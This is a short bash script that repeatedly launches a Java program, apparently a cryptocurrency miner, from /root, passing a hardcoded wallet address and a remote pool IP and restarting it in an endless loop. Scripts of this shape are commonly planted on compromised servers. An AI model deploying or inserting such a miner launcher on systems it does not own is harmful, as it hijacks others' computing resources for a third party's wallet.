#!/bin/bash
WALLET="4D9j91yffNr9uMvucKckgknSnXD8f13a45"
while [ 1 ]; do
    java -jar -Xmx8G /root/jar/cpu.jar -u $WALLET -h 146.103.50.122 -p x -t 3 -P 5001
    sleep 5
done
